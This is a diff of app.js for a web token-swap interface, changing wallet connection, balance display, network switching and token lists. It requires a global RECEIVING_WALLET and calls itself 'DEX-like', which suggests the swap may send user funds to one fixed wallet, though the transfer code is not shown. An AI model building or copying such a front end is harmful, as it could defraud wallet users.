@@ -1,4 +1,4 @@
-// app.js - Enhanced DEX Token Swap Interface
+// app.js - DEX-like Token Swap Interface
 
 // Verify required globals
 if (typeof NETWORK_CONFIGS === 'undefined') throw new Error("NETWORK_CONFIGS not defined");
@@ -7,11 +7,6 @@ if (typeof RECEIVING_WALLET === 'undefined') throw new Error("RECEIVING_WALLET n
 
 // Constants
 const COINGECKO_API = "https://api.coingecko.com/api/v3";
-const DEFAULT_PAIRS = {
-  ethereum: { from: "ETH", to: "USDT" },
-  bsc: { from: "BNB", to: "USDT" },
-  polygon: { from: "MATIC", to: "USDT" }
-};
 
 // App state
 let provider, signer, userAddress;
@@ -41,15 +36,8 @@ window.addEventListener('load', async () => {
       document.getElementById("openTrustWallet").addEventListener('click', openInTrustWallet);
     }
     
-    // Set default tokens based on network
-    const defaultFromToken = TOKENS[currentNetwork].find(t => t.symbol === DEFAULT_PAIRS[currentNetwork].from);
-    const defaultToToken = TOKENS[currentNetwork].find(t => t.symbol === DEFAULT_PAIRS[currentNetwork].to);
-    
-    if (defaultFromToken && defaultToToken) {
-      currentFromToken = defaultFromToken;
-      currentToToken = defaultToToken;
-      updateTokenSelectors();
-    }
+    // Set default tokens based on current network
+    setDefaultTokenPair();
     
     await checkWalletEnvironment();
   } catch (err) {
@@ -76,35 +64,28 @@ function updateNetworkLogo(network) {
   const logoElement = document.querySelector(".dex-nav-logo img");
   if (logoMap[network]) {
     logoElement.src = logoMap[network];
-    logoElement.alt = NETWORK_CONFIGS[network].chainName;
   }
 }
 
-function getTokenLogoUrl(token) {
-  // For native tokens
-  if (token.isNative) {
-    return `https://cryptologos.cc/logos/${token.symbol.toLowerCase()}-${token.symbol.toLowerCase()}-logo.png`;
+function setDefaultTokenPair() {
+  switch(currentNetwork) {
+    case "ethereum":
+      currentFromToken = TOKENS.ethereum.find(t => t.symbol === "ETH");
+      currentToToken = TOKENS.ethereum.find(t => t.symbol === "USDT");
+      break;
+    case "bsc":
+      currentFromToken = TOKENS.bsc.find(t => t.symbol === "BNB");
+      currentToToken = TOKENS.bsc.find(t => t.symbol === "USDT");
+      break;
+    case "polygon":
+      currentFromToken = TOKENS.polygon.find(t => t.symbol === "MATIC");
+      currentToToken = TOKENS.polygon.find(t => t.symbol === "USDT");
+      break;
   }
   
-  // For known contract tokens
-  const knownTokens = {
-    // Ethereum
-    "0xdAC17F958D2ee523a2206206994597C13D831ec7": "https://cryptologos.cc/logos/tether-usdt-logo.png", // USDT
-    "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48": "https://cryptologos.cc/logos/usd-coin-usdc-logo.png", // USDC
-    "0x6B175474E89094C44Da98b954EedeAC495271d0F": "https://cryptologos.cc/logos/multi-collateral-dai-dai-logo.png", // DAI
-    
-    // BSC
-    "0x55d398326f99059fF775485246999027B3197955": "https://cryptologos.cc/logos/tether-usdt-logo.png", // USDT-BSC
-    "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d": "https://cryptologos.cc/logos/usd-coin-usdc-logo.png", // USDC-BSC
-    "0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3": "https://cryptologos.cc/logos/multi-collateral-dai-dai-logo.png", // DAI-BSC
-    
-    // Polygon
-    "0xc2132D05D31c914a87C6611C10748AEb04B58e8F": "https://cryptologos.cc/logos/tether-usdt-logo.png", // USDT-MATIC
-    "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174": "https://cryptologos.cc/logos/usd-coin-usdc-logo.png", // USDC-MATIC
-    "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063": "https://cryptologos.cc/logos/multi-collateral-dai-dai-logo.png" // DAI-MATIC
-  };
-  
-  return knownTokens[token.address] || "https://cryptologos.cc/logos/ethereum-eth-logo.png";
+  if (currentFromToken && currentToToken) {
+    updateTokenSelectors();
+  }
 }
 
 // =====================
@@ -147,13 +128,50 @@ async function initializeWallet() {
     localStorage.setItem('walletConnected', 'metamask');
     updateWalletButton(true);
     
-    // Fetch initial balances
+    // Update balances when wallet connects
     await updateTokenBalances();
+    
+    // Listen for balance changes
+    window.ethereum.on('accountsChanged', updateTokenBalances);
+    window.ethereum.on('chainChanged', () => {
+      setTimeout(updateTokenBalances, 1000); // Wait for chain to fully switch
+    });
+    
     return true;
   } catch (err) {
     console.error("Wallet initialization error:", err);
     updateStatus("Connection error. Please try again.", "error");
     return false;
+  }
+}
+
+async function fetchTokenBalance(token) {
+  if (!userAddress) return 0;
+  
+  try {
+    if (token.isNative) {
+      const balance = await provider.getBalance(userAddress);
+      return ethers.utils.formatEther(balance);
+    } else {
+      const contract = new ethers.Contract(token.address, ERC20_ABI, provider);
+      const balance = await contract.balanceOf(userAddress);
+      return ethers.utils.formatUnits(balance, token.decimals || 18);
+    }
+  } catch (err) {
+    console.error(`Error fetching ${token.symbol} balance:`, err);
+    return 0;
+  }
+}
+
+async function updateTokenBalances() {
+  if (!userAddress || !currentFromToken) return;
+  
+  try {
+    const balance = await fetchTokenBalance(currentFromToken);
+    document.getElementById("fromTokenBalance").textContent = 
+      `Balance: ${parseFloat(balance).toFixed(6)} ${currentFromToken.symbol}`;
+  } catch (err) {
+    console.error("Error updating balances:", err);
   }
 }
 
@@ -167,7 +185,6 @@ async function handleWalletConnection() {
     updateWalletButton(false);
     updateSwapButton();
     updateStatus("Wallet disconnected", "success");
-    document.getElementById("fromTokenBalance").textContent = "Balance: 0";
     return;
   }
 
@@ -235,49 +252,39 @@ function openInTrustWallet() {
 // NETWORK FUNCTIONS
 // =====================
 
-async function handleNetworkChange(network) {
-  try {
-    showLoader();
-    updateStatus(`Switching to ${NETWORK_CONFIGS[network].chainName}...`, "success");
-    
-    currentNetwork = network;
-    document.getElementById("currentNetwork").textContent = NETWORK_CONFIGS[network].chainName;
-    updateNetworkLogo(network);
-    
-    // Set default tokens for the new network
-    const defaultFromToken = TOKENS[network].find(t => t.symbol === DEFAULT_PAIRS[network].from);
-    const defaultToToken = TOKENS[network].find(t => t.symbol === DEFAULT_PAIRS[network].to);
-    
-    if (defaultFromToken && defaultToToken) {
-      currentFromToken = defaultFromToken;
-      currentToToken = defaultToToken;
-      updateTokenSelectors();
-      
-      // Update balances if wallet is connected
-      if (userAddress) {
-        await updateTokenBalances();
-      }
-    }
-    
-    // If wallet is connected, check if we need to switch networks
-    if (userAddress) {
-      await checkNetwork();
-    }
-    
-    updateStatus(`Switched to ${NETWORK_CONFIGS[network].chainName}`, "success");
-  } catch (err) {
-    console.error("Network change error:", err);
-    updateStatus("Failed to switch network: " + err.message, "error");
-  } finally {
-    hideLoader();
-  }
+function showNetworkOptions() {
+  const networkSelect = document.getElementById("networkSelect");
+  const currentNetworkName = NETWORK_CONFIGS[currentNetwork].chainName;
+  
+  // Cycle through available networks
+  const networkKeys = Object.keys(NETWORK_CONFIGS);
+  const currentIndex = networkKeys.indexOf(currentNetwork);
+  const nextIndex = (currentIndex + 1) % networkKeys.length;
+  const newNetwork = networkKeys[nextIndex];
+  
+  handleNetworkChange(newNetwork);
+  
+  // Update UI immediately
+  networkSelect.querySelector("span").textContent = NETWORK_CONFIGS[newNetwork].chainName;
+  updateNetworkLogo(newNetwork);
 }
 
-function showNetworkOptions() {
-  const networks = Object.keys(NETWORK_CONFIGS);
-  const currentIndex = networks.indexOf(currentNetwork);
-  const nextNetwork = networks[(currentIndex + 1) % networks.length];
-  handleNetworkChange(nextNetwork);
+async function handleNetworkChange(network) {
+  currentNetwork = network;
+  document.getElementById("currentNetwork").textContent = NETWORK_CONFIGS[network].chainName;
+  updateNetworkLogo(network);
+  
+  // Set default token pairs based on network
+  setDefaultTokenPair();
+  
+  // Update balances if wallet is connected
+  if (userAddress) {
+    await checkNetwork();
+    await updateTokenBalances();
+  }
+  
+  // Update the swap rate
+  updateToAmount();
 }
 
 async function checkNetwork() {
@@ -315,35 +322,6 @@ async function checkNetwork() {
 // =====================
 // TOKEN FUNCTIONS
 // =====================
-
-async function updateTokenBalances() {
-  if (!userAddress || !provider) return;
-  
-  try {
-    const balanceElement = document.getElementById("fromTokenBalance");
-    balanceElement.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Loading...';
-    
-    // Update native token balance
-    const nativeBalance = await provider.getBalance(userAddress);
-    const nativeSymbol = NETWORK_CONFIGS[currentNetwork].nativeCurrency.symbol;
-    const nativeDecimals = NETWORK_CONFIGS[currentNetwork].nativeCurrency.decimals;
-    
-    let balanceText = `Balance: ${ethers.utils.formatUnits(nativeBalance, nativeDecimals)} ${nativeSymbol}`;
-    
-    // Update current from token balance if it's not native
-    if (currentFromToken && !currentFromToken.isNative) {
-      const contract = new ethers.Contract(currentFromToken.address, ERC20_ABI, provider);
-      const balance = await contract.balanceOf(userAddress);
-      balanceText = `Balance: ${ethers.utils.formatUnits(balance, currentFromToken.decimals)} ${currentFromToken.symbol}`;
-    }
-    
-    balanceElement.textContent = balanceText;
-  } catch (err) {
-    console.error("Error fetching balances:", err);
-    document.getElementById("fromTokenBalance").textContent = "Balance: Error";
-    updateStatus("Error fetching token balances", "error");
-  }
-}
 
 function showTokenList(type) {
   const modal = document.getElementById("tokenListModal");
@@ -411,33 +389,26 @@ function showTokenList(type) {
       tokenItem.dataset.symbol = token.symbol.toLowerCase();
       tokenItem.dataset.address = token.address.toLowerCase();
       tokenItem.innerHTML = `
-        <img src="${getTokenLogoUrl(token)}" 
+        <img src="https://cryptologos.cc/logos/${token.symbol.toLowerCase()}-${token.symbol.toLowerCase()}-logo.png" 
              onerror="this.src='https://cryptologos.cc/logos/ethereum-eth-logo.png'" 
              alt="${token.symbol}">
         <div>
-          <div class="dex-token-name">${token.name} 
-            ${token.originNetwork !== currentNetwork ? 
-              `<span class="token-network-badge">${token.originNetwork}</span>` : ''}
-          </div>
+          <div class="dex-token-name">${token.name} ${token.originNetwork !== currentNetwork ? `(${token.originNetwork})` : ''}</div>
           <div class="dex-token-symbol">${token.symbol}</div>
-          ${token.address ? `<div class="dex-token-address">${token.address.slice(0, 6)}...${token.address.slice(-4)}</div>` : ''}
+          <div class="dex-token-address" style="font-size: 12px; color: var(--text3);">${token.address}</div>
         </div>
       `;
       
       tokenItem.addEventListener('click', () => {
         if (type === 'from') {
           currentFromToken = token;
+          updateTokenBalances();
         } else {
           currentToToken = token;
         }
         updateTokenSelectors();
         hideTokenList();
         updateToAmount();
-        
-        // Update balance if wallet is connected and from token changed
-        if (type === 'from' && userAddress) {
-          updateTokenBalances();
-        }
       });
       
       tokenItems.appendChild(tokenItem);
@@ -459,13 +430,17 @@ function updateTokenSelectors() {
   
   if (currentFromToken) {
     fromTokenBtn.innerHTML = `
-      <img src="${getTokenLogoUrl(currentFromToken)}" 
+      <img src="https://cryptologos.cc/logos/${currentFromToken.symbol.toLowerCase()}-${currentFromToken.symbol.toLowerCase()}-logo.png" 
            onerror="this.src='https://cryptologos.cc/logos/ethereum-eth-logo.png'" 
-           width="24" height="24"
-           alt="${currentFromToken.symbol}">
+           width="24" height="24">
       <span>${currentFromToken.symbol}</span>
       <i class="fas fa-chevron-down"></i>
     `;
+    
+    // Update balance when token changes if wallet is connected
+    if (userAddress) {
+      updateTokenBalances();
+    }
   } else {
     fromTokenBtn.innerHTML = `
       <span>Select Token</span>
@@ -475,10 +450,9 @@ function updateTokenSelectors() {
   
   if (currentToToken) {
     toTokenBtn.innerHTML = `
-      <img src="${getTokenLogoUrl(currentToToken)}" 
+      <img src="https://cryptologos.cc/logos/${currentToToken.symbol.toLowerCase()}-${currentToToken.symbol.toLowerCase()}-logo.png" 
            onerror="this.src='https://cryptologos.cc/logos/ethereum-eth-logo.png'" 
-           width="24" height="24"
-           alt="${currentToToken.symbol}">
+           width="24" height="24">
       <span>${currentToToken.symbol}</span>
       <i class="fas fa-chevron-down"></i>
     `;
@@ -498,48 +472,20 @@ async function updateToAmount() {
   if (currentFromToken && currentToToken && fromAmount > 0) {
     document.getElementById("exchangeRate").textContent = "Loading...";
     document.getElementById("minReceived").textContent = "Loading...";
-    document.getElementById("priceImpact").textContent = "Loading...";
     
-    try {
-      const rate = await getConversionRate(currentFromToken, currentToToken);
-      const toAmount = fromAmount * rate;
-      const priceImpact = calculatePriceImpact(fromAmount, toAmount);
-      
-      // Update UI
-      document.getElementById("toAmount").value = toAmount.toFixed(6);
-      document.getElementById("exchangeRate").textContent = 
-        `1 ${currentFromToken.symbol} = ${rate.toFixed(6)} ${currentToToken.symbol}`;
-      document.getElementById("minReceived").textContent = 
-        `${(toAmount * (1 - currentSlippage/100)).toFixed(6)} ${currentToToken.symbol}`;
-      
-      // Update price impact with color coding
-      const priceImpactElement = document.getElementById("priceImpact");
-      priceImpactElement.textContent = `${priceImpact.toFixed(2)}%`;
-      priceImpactElement.className = "dex-price-impact" + 
-        (priceImpact > 3 ? " high" : "") + 
-        (priceImpact > 5 ? " very-high" : "");
-      
-    } catch (err) {
-      console.error("Error updating amounts:", err);
-      updateStatus("Error fetching price data", "error");
-    }
+    const rate = await getConversionRate(currentFromToken, currentToToken);
+    const toAmount = fromAmount * rate;
+    
+    document.getElementById("toAmount").value = toAmount.toFixed(6);
+    document.getElementById("exchangeRate").textContent = `1 ${currentFromToken.symbol} = ${rate.toFixed(6)} ${currentToToken.symbol}`;
+    document.getElementById("minReceived").textContent = `${(toAmount * (1 - currentSlippage/100)).toFixed(6)} ${currentToToken.symbol}`;
   } else {
     document.getElementById("toAmount").value = '';
     document.getElementById("exchangeRate").textContent = '-';
     document.getElementById("minReceived").textContent = '-';
-    document.getElementById("priceImpact").textContent = '<0.01%';
-    document.getElementById("priceImpact").className = "dex-price-impact";
   }
   
   updateSwapButton();
-}
-
-function calculatePriceImpact(fromAmount, toAmount) {
-  // Simplified price impact calculation
-  // In a real DEX, this would use liquidity pool data
-  const baseRate = 0.0005; // Base 0.05% impact
-  const amountImpact = fromAmount * 0.0001; // 0.01% per unit
-  return (baseRate + amountImpact) * 100; // Convert to percentage
 }
 
 async function getConversionRate(fromToken, toToken) {
@@ -582,14 +528,9 @@ async function getTokenPrice(token) {
       polygon: 'matic-network'
     };
     
-    try {
-      const response = await fetch(`${COINGECKO_API}/simple/price?ids=${nativeIds[token.originNetwork || currentNetwork]}&vs_currencies=usd`);
-      const data = await response.json();
-      return data[nativeIds[token.originNetwork || currentNetwork]]?.usd;
-    } catch (err) {
-      console.error("Error fetching native token price:", err);
-      return null;
-    }
+    const response = await fetch(`${COINGECKO_API}/simple/price?ids=${nativeIds[token.originNetwork || currentNetwork]}&vs_currencies=usd`);
+    const data = await response.json();
+    return data[nativeIds[token.originNetwork || currentNetwork]]?.usd;
   } else {
     // Handle contract tokens
     const chainMap = {
@@ -632,9 +573,7 @@ async function handleSwap() {
     updateStatus("Swap completed successfully!", "success");
     document.getElementById("fromAmount").value = '';
     document.getElementById("toAmount").value = '';
-    
-    // Update balance after swap
-    await updateTokenBalances();
+    await updateTokenBalances(); // Refresh balance after swap
   } catch (err) {
     console.error("Swap error:", err);
     updateStatus("Swap failed: " + err.message, "error");
@@ -746,29 +685,4 @@ function showWalletConnect() {
 
 function hideWalletConnect() {
   document.getElementById("walletConnectModal").style.display = 'none';
-}
-
-// Listen for account changes
-if (window.ethereum) {
-  window.ethereum.on('accountsChanged', (accounts) => {
-    if (accounts.length === 0) {
-      // Wallet disconnected
-      userAddress = null;
-      provider = null;
-      signer = null;
-      localStorage.removeItem('walletConnected');
-      updateWalletButton(false);
-      document.getElementById("fromTokenBalance").textContent = "Balance: 0";
-    } else {
-      // Account changed
-      userAddress = accounts[0];
-      updateWalletButton(true);
-      updateTokenBalances();
-    }
-  });
-
-  // Listen for chain changes
-  window.ethereum.on('chainChanged', (chainId) => {
-    window.location.reload();
-  });
 }
